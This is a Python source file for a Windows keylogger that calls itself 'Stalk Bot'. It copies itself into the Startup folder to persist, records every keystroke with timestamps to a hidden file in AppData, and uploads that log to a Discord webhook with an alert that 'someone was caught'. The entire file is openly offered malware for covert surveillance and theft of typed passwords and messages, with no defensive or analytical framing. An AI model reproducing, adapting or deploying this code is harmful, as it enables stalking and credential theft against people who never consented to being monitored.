import os
import sys
import shutil
from pynput.keyboard import Listener
import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

webhook = DiscordWebhook(url="WebHook_URL", username = "Stalk Bot", avatar_url = "https://avatars.githubusercontent.com/u/91149112")

try:
    startup_folder = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    exe_path = sys.argv[0]
    exe_name = os.path.basename(exe_path)
    destination = os.path.join(startup_folder, exe_name)

    if not os.path.exists(destination):
        shutil.copyfile(exe_path, destination)
except:
    pass

try:
    logpath = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\tempfile.txt")
    if not os.path.exists(logpath):
        with open(logpath, "w") as file:
            file.write("First time file")
except:
    pass



with open(logpath, "r") as file:
    webhook.add_file(file=file.read(), filename="keylog.txt")

embed = DiscordEmbed(title=f"**STALKER got an HIT !**",
                        url="https://github.com/NinjaPanic",
                        description=f"""||@everyone||\n\n**### Someone was caught, the computer restarted, or the program was launched. Check the keylog.txt**""",
                        color="9B26B6"
                    )
embed.set_footer(text="Stalk by NinjaPanic ・ https://github.com/NinjaPanic")

webhook.add_embed(embed)
webhook.execute()

with open(logpath, "w") as file1:
  file1.write("")

count = k = 0
keys = []

def write_file(keys):
    global k

    with open(logpath, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("Key") == -1:
                f.write(k)

def on_press(key):
    global keys

    keys.append(key)
    for key in keys:
        k = str(key).replace("'","")
        if k.find("space") > 0:
            now = datetime.datetime.now()
            write_file(now.strftime("%y-%m-%d %H:%M:%S"))
            write_file(" : ")
            write_file(keys)
            write_file("\n")
            keys = []

with Listener(on_press=on_press) as Listener:
    Listener.join()